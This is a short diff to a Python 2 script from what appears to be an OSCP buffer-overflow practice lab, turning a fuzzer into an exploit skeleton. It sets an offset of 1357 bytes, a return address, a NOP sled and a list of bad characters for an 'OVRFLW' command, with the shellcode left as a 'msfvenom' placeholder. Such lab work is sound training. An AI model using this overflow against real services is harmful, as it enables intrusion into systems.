@@ -1,7 +1,5 @@
 https://github.com/3isenHeiM/OSCP-BoF
 
-Ini nanti OSCP buat fuzz nya :
-
 #!/usr/bin/python
 
 import sys, socket
@@ -10,8 +8,15 @@ if len(sys.argv) < 2:
     print "\nUsage: " + sys.argv[0] + " <HOST>\n"
     sys.exit()
 
+nop = "\x90" * 8
+badchars = (
+"msfvenom"    
+)
+
+#badchars : x00 , x04 , x16 , x4a , x6d
+#pointer 0x56526683 => "\x83\x66\x52\x56"
 cmd = "OVRFLW "
-junk = "\x41" * 3000
+junk = "A" * 1357 + "\x83\x66\x52\x56" + nop + badchars
 end = "\r\n"
 
 buffer = cmd + junk + end
